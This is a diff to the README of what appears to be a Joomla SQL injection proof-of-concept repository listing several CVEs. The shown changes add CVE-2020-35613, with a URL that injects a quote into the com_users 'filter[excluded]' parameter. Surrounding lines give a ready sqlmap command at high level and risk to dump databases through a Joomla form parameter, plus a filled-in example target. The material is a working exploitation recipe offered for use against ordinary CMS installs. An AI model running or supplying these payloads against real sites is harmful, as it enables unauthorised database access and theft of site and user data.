@@ -1,5 +1,7 @@
 # Joomla-SQLinjection PoC
 
+0. CVE-2020-35613
+
 1. CVE-2020-10243
 
 2. CVE-2019-19846
@@ -59,8 +61,17 @@ https://vimeo.com/398763205
  *sqlmap -r sqli.joomla.req --level=5 --risk=3 -p "jform%5Bparams%5D%5Bfeatured_categories%5D%5B%5D" --dbms=mysql --second-url "[your domain/IP]/index.php" --technique=E --dbs*
 ## Example:
 sqlmap -r sqli.joomla.req --level=5 --risk=3 -p "jform%5Bparams%5D%5Bfeatured_categories%5D%5B%5D" --dbms=mysql --second-url "http://192.168.131.134:8080/index.php" --technique=E --dbs
+## 0. CVE-2020-35613 : SQL injection in com_users list view
+# Author : ka1n4t
+# PoC by : Hoang Kien
+## User requirement: admin (Not superadmin)
+## Detecting:
+[your domain/IP]/administrator/index.php?option=com_users&view=users&filter[excluded]='
 
+![image](https://user-images.githubusercontent.com/24661746/102855478-50994e80-4457-11eb-8d6a-efeb51b9ac96.png)
 Reference:
+
+0. https://www.empressia.pl/blog/184-analiza-podatnosci-sql-injection-w-cms-joomla
 1. https://pentest.co.uk/labs/advisory/cve-2020-10243/
 2. https://xz.aliyun.com/t/6990
 3. https://github.com/luckybool1020/CVE-2018-8045
